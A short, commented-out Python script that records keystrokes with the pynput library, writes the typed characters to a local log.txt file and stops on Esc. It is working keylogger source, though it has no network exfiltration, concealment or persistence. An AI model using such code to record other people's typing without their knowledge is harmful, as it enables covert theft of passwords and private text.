# #  Date & Time 02/06/2024, 01:40.
# #  @author Mesfin Haftu + OAI
#
# import pynput  # pynput is used for keyboard events
# from pynput.keyboard import Key, Listener
#
# keys = []  # used to store temporary keystrokes
#
#
# def on_press(key):
#     keys.append(key)
#     write_file(keys)
#
#
# # TODO
# def write_file(keys):
#     with open("log.txt", "a") as f:
#         for key in keys:
#             k = str(key).replace("'", "")
#             if k.find("space") > 0:
#                 f.write('\n')
#             elif k.find("Key") == -1:
#                 f.write(k)
#     keys.clear()
#
#
# def on_release(key):
#     if key == Key.esc:
#         return False
#
#
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()
